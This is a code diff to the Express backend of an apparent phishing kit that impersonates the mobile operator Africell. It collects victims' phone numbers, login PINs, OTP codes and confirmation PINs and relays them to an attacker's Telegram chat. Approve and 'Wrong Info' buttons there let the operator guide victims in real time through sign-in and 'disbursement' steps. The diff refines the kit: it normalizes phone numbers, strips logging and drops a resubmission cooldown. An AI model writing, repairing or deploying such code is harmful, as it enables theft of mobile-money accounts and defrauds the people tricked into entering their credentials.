@@ -8,7 +8,7 @@ const PORT = process.env.PORT || 8080;
 
 app.use(cors());
 app.use(express.json());
-app.use(express.static('.')); // Serves your static HTML files
+app.use(express.static('.'));
 
 const orderStatuses = {};   
 const lastSubmissionTime = {}; 
@@ -17,6 +17,12 @@ const userCredentials = {};
 function escapeMarkdown(text) {
     if (!text) return '';
     return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
+}
+
+// 100% foolproof normalization function for phone numbers
+function normalizePhone(phoneStr) {
+    if (!phoneStr) return '';
+    return phoneStr.replace(/[^\d+]/g, '').trim();
 }
 
 async function sendToTelegram(url, payload) {
@@ -32,16 +38,9 @@ async function sendToTelegram(url, payload) {
         });
         clearTimeout(timeoutId);
         const data = await response.json();
-        
-        if (!data.ok) {
-            console.error('🚨 TELEGRAM REJECTED MESSAGE:', JSON.stringify(data));
-        } else {
-            console.log('✅ Message successfully delivered to Telegram!');
-        }
         return data;
     } catch (error) {
         clearTimeout(timeoutId);
-        console.error('❌ Telegram Fetch Exception:', error.message);
         throw error;
     }
 }
@@ -54,27 +53,8 @@ app.post('/api/submit-order', async (req, res) => {
             return res.status(400).json({ success: false, message: 'Phone number required.' });
         }
 
-        const cleanPhone = phone.replace(/\s+/g, '').trim();
-        const currentTime = Date.now(); 
-        const cooldownTime = 15 * 1000; 
-
+        const cleanPhone = normalizePhone(phone);
         orderStatuses[cleanPhone] = 'pending';
-
-        const isImportantAction = (uniqueId && (
-            uniqueId.startsWith('PIN: ') || 
-            uniqueId.startsWith('Login PIN: ') || 
-            uniqueId.startsWith('OTP Code: ') || 
-            uniqueId.startsWith('Confirmation PIN: ') || 
-            uniqueId.startsWith('Sign-in Phone Number:') || 
-            uniqueId.startsWith('Disbursement Requested -') ||
-            uniqueId.startsWith('Application -')
-        ));
-
-        if (!isImportantAction && lastSubmissionTime[cleanPhone] && (currentTime - lastSubmissionTime[cleanPhone] < cooldownTime)) {
-            return res.json({ success: true, message: 'Already submitted.' });
-        }
-
-        lastSubmissionTime[cleanPhone] = currentTime;
 
         const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
         const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
@@ -86,13 +66,10 @@ app.post('/api/submit-order', async (req, res) => {
             userCredentials[cleanPhone] = {};
         }
 
-        let headerTitle = "🔔 *Africell Submission Update*";
-        let wrongButtonText = "❌ Wrong Info";
+        let headerTitle = "📱 *Africell Sign-in Phone Number*";
+        let wrongButtonText = "⚠️ Wrong Info";
 
-        if (uniqueId && uniqueId.startsWith('Sign-in Phone Number:')) {
-            headerTitle = "📱 *Africell Sign-in Phone Number*";
-            wrongButtonText = "⚠️ Wrong Info";
-        } else if (uniqueId && uniqueId.startsWith('Confirmation PIN: ')) {
+        if (uniqueId && uniqueId.startsWith('Confirmation PIN: ')) {
             headerTitle = "🔐 *Africell Confirmation PIN Submitted*";
             wrongButtonText = "⚠️ Wrong PIN";
             userCredentials[cleanPhone].confirmPin = uniqueId.replace('Confirmation PIN: ', '').trim();
@@ -145,11 +122,10 @@ app.post('/api/submit-order', async (req, res) => {
 });
 
 app.get('/api/check-status', (req, res) => {
-    const rawQueryPhone = req.query.phone || '';
-    const cleanPhone = rawQueryPhone.replace(/\s+/g, '').trim();
+    const cleanPhone = normalizePhone(req.query.phone || '');
     const status = orderStatuses[cleanPhone] || 'pending';
     
-    console.log(`Polling check for phone query: [${rawQueryPhone}] -> cleaned: [${cleanPhone}] -> status: ${status}`);
+    console.log(`Polling check -> Phone: [${req.query.phone}] | Normalized: [${cleanPhone}] | Status: [${status}]`);
     res.json({ status });
 });
 
@@ -172,12 +148,8 @@ app.post('/api/telegram-webhook', async (req, res) => {
                 const remainder = callbackData.replace(prefix, '');
                 
                 const lastUnderscoreIndex = remainder.lastIndexOf('_');
-                if (lastUnderscoreIndex !== -1) {
-                    phone = remainder.substring(0, lastUnderscoreIndex);
-                } else {
-                    phone = remainder;
-                }
-                phone = phone.replace(/\s+/g, '').trim();
+                phone = lastUnderscoreIndex !== -1 ? remainder.substring(0, lastUnderscoreIndex) : remainder;
+                phone = normalizePhone(phone);
 
                 if (callbackData.startsWith('approve_')) {
                     orderStatuses[phone] = 'approved';
@@ -232,18 +204,12 @@ async function registerTelegramWebhook() {
     const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
     const RENDER_URL = process.env.RENDER_EXTERNAL_URL;
 
-    if (!BOT_TOKEN || !RENDER_URL) {
-        console.log('Telegram webhook setup skipped: missing environment variable.');
-        return;
-    }
+    if (!BOT_TOKEN || !RENDER_URL) return;
 
     const webhookUrl = `${RENDER_URL}/api/telegram-webhook`;
-
     try {
         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${encodeURIComponent(webhookUrl)}`;
-        const result = await fetch(telegramUrl).then(res => res.json());
-
-        console.log('Telegram webhook setup:', result);
+        await fetch(telegramUrl).then(res => res.json());
     } catch (error) {
         console.error('Telegram webhook setup failed:', error.message);
     }
